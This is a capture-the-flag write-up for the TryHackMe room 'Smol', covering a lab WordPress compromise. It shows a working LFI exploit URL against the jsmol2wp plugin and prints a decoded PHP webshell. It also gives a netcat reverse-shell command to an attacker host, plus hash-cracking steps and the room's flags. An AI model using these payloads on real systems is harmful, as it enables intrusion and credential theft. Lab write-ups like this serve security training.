# TryHackMe — Smol | Full Writeup

## Room Info

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | TryHackMe                      |
| Room        | Smol                           |
| Difficulty  | Medium                         |
| Tags        | WordPress, LFI, Backdoor, Privilege Escalation |
| Author      | TryHackMe                      |

---

## Summary

Smol is a medium-difficulty room centered around a WordPress site with a vulnerable plugin and a backdoored plugin. The attack chain involves exploiting a Local File Inclusion (LFI) vulnerability in the **jsmol2wp** plugin (CVE-2018-20463) to discover a webshell hidden inside the **Hello Dolly** plugin. From there, we obtain a reverse shell, extract password hashes from the MySQL database, and perform lateral movement through five different users before achieving root access.

**Attack Chain Overview:**

```
Enumeration → LFI (jsmol2wp) → wp-config.php (DB creds)
  → WordPress login (wpuser) → Hello Dolly backdoor → Reverse Shell (www-data)
    → MySQL hash dump → Crack diego's password → user flag
      → SSH key (think) → Empty password (gege) → Password-protected backup
        → Old wp-config.php with xavi's creds → sudo ALL → root flag
```

---

## Phase 1: Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
```

**Results:**

| Port | Service | Version                              |
|------|---------|--------------------------------------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13     |
| 80   | HTTP    | Apache 2.4.41 (Ubuntu)               |

The HTTP server returned a **302 redirect** to `http://www.smol.thm`, indicating a virtual host configuration.

### Adding the Hostname

```bash
echo "<TARGET_IP> www.smol.thm smol.thm" | sudo tee -a /etc/hosts
```

### WordPress Enumeration

Inspecting the HTML source revealed the CMS and plugin information:

```bash
curl -s http://www.smol.thm | grep -i "wp-content/plugins" | sed 's/.*plugins\///' | cut -d'/' -f1 | sort -u
```

**Result:** `jsmol2wp`

A WPScan confirmed the findings:

```bash
wpscan --url http://www.smol.thm -e u,ap
```

**Key findings:**

- WordPress version: 6.7.1
- Theme: Twenty Twenty-Three 1.2
- Plugin: **jsmol2wp 1.07** (last updated 2018)
- XML-RPC enabled
- Upload directory listing enabled

**Users discovered:** admin, think, wp, gege, diego, xavi

The REST API (`/index.php/wp-json/wp/v2/users`) revealed additional details — user **think** was described as "Webmaster Admin Account / Dev".

---

## Phase 2: Exploitation — LFI (CVE-2018-20463)

### Vulnerability Details

The jsmol2wp plugin version 1.07 is vulnerable to Local File Inclusion via directory traversal in the `query` parameter of `jsmol.php`. The plugin accepts PHP stream wrappers, allowing an attacker to read arbitrary files on the server.

**CVE:** CVE-2018-20463  
**Type:** Local File Inclusion / Arbitrary File Read  
**CVSS:** 7.5 (High)

### Reading wp-config.php

```bash
curl -s "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php"
```

**Extracted credentials:**

| Constant    | Value                       |
|-------------|-----------------------------|
| DB_NAME     | wordpress                   |
| DB_USER     | wpuser                      |
| DB_PASSWORD | kbLSF2Vop#lw3rjDZ629*Z%G   |
| DB_HOST     | localhost                   |

Additionally, all WordPress security keys/salts were left at their default values (`put your unique phrase here`), indicating poor configuration.

### WordPress Login

Testing the database credentials against the WordPress login form revealed that **wpuser** reused the same password for their WordPress account:

```bash
curl -s -d "log=wpuser&pwd=kbLSF2Vop#lw3rjDZ629*Z%G&wp-submit=Log+In" \
  -i http://www.smol.thm/wp-login.php | grep -ci "Location:.*wp-admin"
```

**Result:** `1` — successful login.

### Discovering the Backdoor in Hello Dolly

Using the LFI vulnerability with a base64 encoding filter to read the full source code of Hello Dolly:

```bash
curl -s "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/convert.base64-encode/resource=../../../../wp-content/plugins/hello.php" | base64 -d
```

Inside the `hello_dolly()` function, a malicious line was found:

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

Decoding the base64 string:

```php
if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

The octal/hex escape sequences decode to `cmd`, revealing a classic webshell:

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

The backdoor was **triple-obfuscated**: PHP code wrapped in base64, with the parameter name encoded using mixed octal and hexadecimal notation. This evades simple grep-based detection for strings like "cmd" or "system".

---

## Phase 3: Initial Access — Reverse Shell

### Obtaining a Session Cookie

```bash
curl -s -c cookies.txt -d "log=wpuser&pwd=kbLSF2Vop#lw3rjDZ629*Z%G&wp-submit=Log+In" \
  http://www.smol.thm/wp-login.php -L > /dev/null
```

The backdoor executes within `hello_dolly()`, which is triggered by `add_action('admin_notices', 'hello_dolly')` — meaning it only runs on authenticated WordPress admin pages.

### RCE Verification

```bash
curl -s -b cookies.txt "http://www.smol.thm/wp-admin/?cmd=whoami" | grep "www-data"
```

**Result:** `www-data` — command execution confirmed.

### Reverse Shell

**Listener (Kali):**

```bash
nc -lvnp 4444
```

**Trigger (via backdoor):**

```bash
curl -s -b cookies.txt "http://www.smol.thm/wp-admin/?cmd=busybox+nc+<ATTACKER_IP>+4444+-e+/bin/bash"
```

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

---

## Phase 4: Lateral Movement

### System Users

```bash
cat /etc/passwd | grep bash
```

| User   | UID  | Home           |
|--------|------|----------------|
| root   | 0    | /root          |
| think  | 1000 | /home/think    |
| xavi   | 1001 | /home/xavi     |
| diego  | 1002 | /home/diego    |
| gege   | 1003 | /home/gege     |
| ubuntu | 1005 | /home/ubuntu   |

### Step 1: www-data → diego (MySQL Hash Cracking)

Connected to MySQL using the credentials from wp-config.php to extract WordPress password hashes:

```bash
mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G' wordpress \
  -e "SELECT user_login, user_pass FROM wp_users;"
```

| user_login | user_pass                            |
|------------|--------------------------------------|
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.  |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.  |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/  |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1  |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1   |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1  |

Cracking with John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Cracked:** `diego:sandiegocalifornia`

Switching user:

```bash
su diego
# Password: sandiegocalifornia
```

### User Flag

```bash
cat /home/diego/user.txt
```

```
45edaec653ff9ee06236b7ce72b86963
```

### Step 2: diego → think (SSH Key)

Diego belongs to the `internal` group, which grants access to think's home directory:

```bash
id
# uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
```

Think's `.ssh` directory was readable:

```bash
ls -la /home/think/.ssh/
cat /home/think/.ssh/id_rsa
```

The private SSH key was extracted and used to log in:

```bash
# On Kali:
chmod 600 /tmp/think_rsa
ssh -i /tmp/think_rsa think@<TARGET_IP>
```

### Step 3: think → gege (Empty Password)

From think's shell, switching to gege required no password:

```bash
su gege
# Just press Enter — empty password
```

### Step 4: gege → xavi (Old Backup)

Gege's home directory contained a WordPress backup:

```bash
ls -la /home/gege/
# -rwxr-x--- 1 root gege 32266546 Aug 16 2023 wordpress.old.zip
```

The archive was password-protected. Transferred to Kali and cracked:

```bash
zip2john wordpress.old.zip > zip_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```

**Cracked:** `hero_gege@hotmail.com`

Extracting the archive and reading the old configuration:

```bash
unzip wordpress.old.zip
# Password: hero_gege@hotmail.com
cat wordpress.old/wp-config.php | grep "DB_"
```

| Constant    | Value          |
|-------------|----------------|
| DB_USER     | xavi           |
| DB_PASSWORD | P@ssw0rdxavi@  |

Switching to xavi:

```bash
su xavi
# Password: P@ssw0rdxavi@
```

---

## Phase 5: Privilege Escalation — Root

### sudo -l

```bash
xavi@smol:~$ sudo -l
User xavi may run the following commands:
    (ALL : ALL) ALL
```

Xavi has **full sudo privileges** — no restrictions.

### Root Access

```bash
sudo su
cat /root/root.txt
```

```
bf89ea3ea01992353aef1f576214d4e4
```

---

## Flags

| Flag | Value                              |
|------|------------------------------------|
| User | 45edaec653ff9ee06236b7ce72b86963   |
| Root | bf89ea3ea01992353aef1f576214d4e4   |

---

## Key Takeaways

1. **Always test found credentials everywhere.** The database password worked for a WordPress account (wpuser), and old backup credentials worked for a system user (xavi). Brute force should always be the last resort.

2. **Old backups are gold.** The `wordpress.old.zip` file contained credentials from a previous configuration that were still valid for a system user with full sudo access.

3. **Abandoned plugins are dangerous.** The jsmol2wp plugin hadn't been updated since 2018 and provided the initial foothold through LFI.

4. **Backdoors can be heavily obfuscated.** The Hello Dolly webshell used three layers of obfuscation (base64 encoding, eval(), and mixed octal/hex parameter encoding) to evade detection.

5. **Group memberships matter.** The `internal` group provided lateral movement between users whose home directories would otherwise be inaccessible.

6. **Each step unlocks the next.** This room demonstrates a realistic privilege escalation chain where no single vulnerability grants root — instead, it requires methodically chaining multiple findings together.

---

## Tools Used

- nmap
- WPScan
- curl
- John the Ripper
- zip2john
- netcat (busybox nc)
- MySQL client
